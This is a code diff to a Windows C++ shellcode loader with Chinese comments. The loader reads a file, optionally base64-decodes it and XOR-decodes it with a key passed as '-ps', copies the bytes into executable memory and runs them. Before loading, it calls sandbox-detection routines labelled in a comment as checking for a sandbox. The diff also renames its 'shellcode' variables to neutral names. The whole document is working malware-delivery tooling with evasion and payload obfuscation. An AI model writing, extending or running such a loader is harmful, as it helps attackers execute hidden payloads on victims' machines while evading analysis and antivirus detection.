@@ -22,6 +22,14 @@
 #include <fstream>
 #include <cstring>
 #include <iostream>
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <string>
+#include <stdexcept>
+#include <fcntl.h>
+#include <io.h>
+#include <cstring>
 using namespace std;
 
 void isTimeAccelerated() {
@@ -276,52 +284,126 @@ void ip() {
   //  return decoded_data;
 //}
 
-int main(int argc, char* argv[]) {
+// Base64 解码函数
+std::vector<unsigned char> base64_decode(const std::string& encoded_string) {
+    const std::string base64_chars =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz"
+        "0123456789+/";
 
-    if (argc != 3 || std::strcmp(argv[1], "-file") != 0) {
+    std::vector<unsigned char> ret;
+    int in_len = encoded_string.size();
+    int i = 0, j = 0, in_ = 0;
+    unsigned char char_array_4[4], char_array_3[3];
+
+    while (in_ < in_len) {
+        char c = encoded_string[in_];
+        if (c == '=') break;
+        size_t pos = base64_chars.find(c);
+        if (pos == std::string::npos) {
+            ++in_;
+            continue;
+        }
+        char_array_4[i++] = c;
+        ++in_;
+        if (i == 4) {
+            for (i = 0; i < 4; i++)
+                char_array_4[i] = base64_chars.find(char_array_4[i]);
+
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+            for (i = 0; i < 3; i++)
+                ret.push_back(char_array_3[i]);
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (j = i; j < 4; j++)
+            char_array_4[j] = 0;
+
+        for (j = 0; j < 4; j++)
+            char_array_4[j] = base64_chars.find(char_array_4[j]);
+
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+        for (j = 0; j < i - 1; j++)
+            ret.push_back(char_array_3[j]);
+    }
+
+    return ret;
+}
+
+// 应用偏移量（异或操作）
+void apply_xor(std::vector<unsigned char>& data, const std::string& ps) {
+    if (ps.empty()) return;
+    size_t ps_len = ps.size();
+    for (size_t i = 0; i < data.size(); ++i) {
+        data[i] ^= static_cast<unsigned char>(ps[i % ps_len]);
+    }
+}
+
+int main(int argc, char* argv[]) {
+    // 检查参数
+    if (argc < 3 || std::strcmp(argv[1], "-file") != 0) {
+        std::cerr << "ERROR: " << argv[0] << "   " << std::endl;
         return -1;
     }
 
+    //检查是否在 沙盒 中运行
     isTimeAccelerated();
     ddt();
     ip();
-    //std::string file_path = "main.txt";
-    //RingQ(file_path);
 
-    // 检查命令行参数
-
-    // 获取 shellcode 文件路径
+    // 获取文件路径
     const char* filePath = argv[2];
-    std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);
+    std::ifstream inputFile(filePath, std::ios::binary | std::ios::ate);
 
-    if (!shellcodeFile.is_open()) {
-        //std::cerr << "Failed to open shellcode file: " << filePath << std::endl;
+    if (!inputFile.is_open()) {
+        std::cerr << "Failed to open file: " << filePath << std::endl;
         return -1;
     }
 
     // 获取文件大小
-    std::streamsize byte_sequence_length = shellcodeFile.tellg();
-    shellcodeFile.seekg(0, std::ios::beg);
+    std::streamsize fileSize = inputFile.tellg();
+    inputFile.seekg(0, std::ios::beg);
 
-    // 分配内存并读取文件内容到内存中
-    char* byte_sequence = new char[byte_sequence_length];
-    if (!shellcodeFile.read(byte_sequence, byte_sequence_length)) {
-        //std::cerr << "Failed to read shellcode from file: " << filePath << std::endl;
-        delete[] byte_sequence;
+    // 读取文件内容
+    std::vector<unsigned char> fileData(fileSize);
+    if (!inputFile.read(reinterpret_cast<char*>(fileData.data()), fileSize)) {
+        std::cerr << "Failed to read file: " << filePath << std::endl;
         return -1;
     }
 
+    // 检查是否有 -ps 参数
+    std::string ps;
+    for (int i = 3; i < argc; ++i) {
+        if (std::strcmp(argv[i], "-ps") == 0 && i + 1 < argc) {
+            ps = argv[i + 1];
+            break;
+        }
+    }
+
+    // 如果有 -ps 参数，进行 Base64 解码和应用偏移量
+    if (!ps.empty()) {
+        std::string encodedData(fileData.begin(), fileData.end());
+        fileData = base64_decode(encodedData);
+        apply_xor(fileData, ps);
+    }
+
     // 分配可执行内存
-    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (execMemory == NULL) {
-        //std::cerr << "Failed to allocate memory." << std::endl;
-        delete[] byte_sequence;
+        std::cerr << "Failed to allocate memory." << std::endl;
         return -1;
     }
 
     // 将文件内容拷贝到分配的内存
-    memcpy(execMemory, byte_sequence, byte_sequence_length);
-    //delete[] byte_sequence;
+    memcpy(execMemory, fileData.data(), fileData.size());
 
     // 将内存地址转换为函数指针
     typedef void (*ShellcodeFunc)();
@@ -333,5 +415,5 @@ int main(int argc, char* argv[]) {
     // 释放分配的内存
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
-    //system("pause");
+    return 0;
 }
